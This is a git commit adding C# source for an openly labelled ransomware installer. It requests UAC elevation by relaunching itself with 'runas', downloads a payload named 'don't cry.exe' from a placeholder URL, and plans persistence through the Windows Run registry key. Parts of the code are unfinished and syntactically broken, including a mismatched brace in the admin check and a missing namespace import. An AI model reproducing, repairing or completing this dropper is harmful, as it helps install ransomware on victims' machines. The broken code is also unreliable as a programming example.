4daac3b46e59340b8685e5e8dcc23063efc46c4d
Tina-1300 <tina.xytrfgthuji1348@gmail.com>
2024-09-25 12:11:53 +0200

    Update installateur C#

---
+++ C# instalateur virus/Lfd.cs
@@ -0,0 +1,87 @@
+using System;
+using System.IO;
+using System.Net.Http;
+using System.Security.Principal;
+
+namespace Lfd{
+    class MalwaireFunction{
+
+        public static void donload(string url, string file){
+            using (var client = new HttpClient()){
+                using (var s = client.GetStreamAsync(url)){
+                    using (var fs = new FileStream(file, FileMode.OpenOrCreate)){
+                        s.Result.CopyTo(fs);
+                    }
+                }
+            }
+        }
+
+        public static bool fileExiste(string file){ 
+            return File.Exists(file) ? true : false;
+        }
+
+
+        #if WINDOWS
+        public static bool IsRunningAsAdministrator(){
+            try{
+                var identity = WindowsIdentity.GetCurrent();
+                var principal = new WindowsPrincipal(identity);
+                return principal.IsInRole(WindowsBuiltInRole.Administrator);
+            }
+            catch{
+                return false;
+                
+            }
+        }
+        #endif
+
+        // a tester
+        public static bool DirectoryExistE(string directory){
+            if(Directory.Exists(directory)){
+                return true;
+            }else{
+                return  false;
+            }
+        }
+
+
+        public static bool IsRoot(){
+            #if WINDOWS
+            if(!IsRunningAsAdministrator()){}
+                return false;
+            }// r'envoi true si il et deja admin et si il et pas admin il renvoi false 
+
+            #endif
+            return true;
+        }
+
+        public static void ElevatROOT(bool number){
+            if (number == false){
+                //elever les privilège
+                #if WINDOWS
+                var processInfo = new ProcessStartInfo{
+                    FileName = Process.GetCurrentProcess().MainModule.FileName,
+                    UseShellExecute = true,
+                    Verb = "runas", 
+                    Arguments = Environment.CommandLine 
+                };
+
+                try{
+                    Process.Start(processInfo);
+                    Environment.Exit(0);
+                }catch (Exception ex){
+                    Console.WriteLine("Error : " + ex.Message);
+                }
+                #endif 
+            }else{
+                // les privilège sont déjà élever
+                //Console.WriteLine("Programme qui et deja executer en mode admin, ou vous n'êtes pas sous windows");
+            }
+        }
+
+
+
+    };
+
+};
+
---
+++ C# instalateur virus/Program.cs
@@ -0,0 +1,59 @@
+﻿using System;
+using System.IO;
+using System.Net.Http;
+using Lfd;
+using System.Security.Principal;
+
+
+class Program{
+
+    static void Main(){
+        // faire une fonction  pour demander les droit admin sinon on ne run pas 
+        
+        bool IsAdmin = MalwaireFunction.IsRoot();
+        bool MalwaireFile = MalwaireFunction.fileExiste("don't cry.exe");// nom du virue ransomwaire
+        bool MusicFile = MalwaireFunction.fileExiste("p.wav");// nom de la musique pour le virus 
+        bool isDirectory = MalwaireFunction.DirectoryExistE("./bin");
+
+        GotIS://label
+        if(IsAdmin == true){
+            // effectuer les tache l'utilisateur et root 
+
+            
+            /*
+                1 - vérifier si le dossier WindowsRTT et dans le disque C:/
+                2 - Si l'étape 1 et validé et que il y a bien le dossier alor on vérifi si dans le dossier il y a les fichier du virus si il y sont on run le virus si il n'y sont pas alor on télécharge le virus 
+                3 - Si l'étape 1 et validé et que il a du cree le dossier car il ne l'été pas alors on vérifi si les fichier du virus sont télécharger et si non on les mov dans le repertoir sinon si oui on les mov dans le repertoir
+                4 - avant de run le virus il faut vérifier si dans la cle de registre : Ordinateur\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run il y a pas deja le virus si non alor on le rajoute et on dit dans quelle repertoir il ce trouve
+            */
+            if(isDirectory == true){
+                Console.WriteLine("Le fichier existe");
+            }else{
+                Console.WriteLine("Error");
+            }
+
+            if(MalwaireFile == true){
+                Console.WriteLine("Le logiciel et bien sur le repertoir");
+                Console.ReadLine();
+            }else{
+                MalwaireFunction.donload("https://githubdddd", "don't cry.exe"); // télécharger le malwaire sur le repertoir actuelle
+
+            }
+
+        }else{
+            // demander elavation 
+            MalwaireFunction.ElevatROOT(IsAdmin);
+            goto GotIS;// allez au label une fois l'elevation de privilège terminer refaire 
+            // la condition pour voir si on et admin ou pas
+
+        }
+        
+    }
+
+
+
+};
+
+
+
+
